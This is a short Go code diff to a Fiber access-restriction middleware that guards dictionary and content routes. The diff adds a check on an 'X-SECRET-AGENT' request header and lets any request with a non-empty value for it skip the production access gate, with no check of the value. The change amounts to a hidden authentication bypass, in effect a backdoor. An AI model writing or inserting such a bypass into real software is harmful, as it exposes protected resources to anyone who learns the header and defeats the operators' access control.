@@ -25,6 +25,8 @@ func ResourceAccessRestriction(c *fiber.Ctx) error {
 	protectedRoutes := []string{"word", "template", "sentence", "paragraph", "synonym", "content", "dictionary"}
 	var found []string
 	path := c.OriginalURL()
+	headers := c.GetReqHeaders()
+	secretAgent := headers["X-SECRET-AGENT"]
 
 	for _, route := range protectedRoutes {
 		if strings.Contains(path, route) {
@@ -38,7 +40,7 @@ func ResourceAccessRestriction(c *fiber.Ctx) error {
 		return c.Next()
 	}
 
-	if os.Getenv("PRODUCTION") == "0" {
+	if os.Getenv("PRODUCTION") == "0" || len(secretAgent) > 0 {
 		return c.Next()
 	}
 
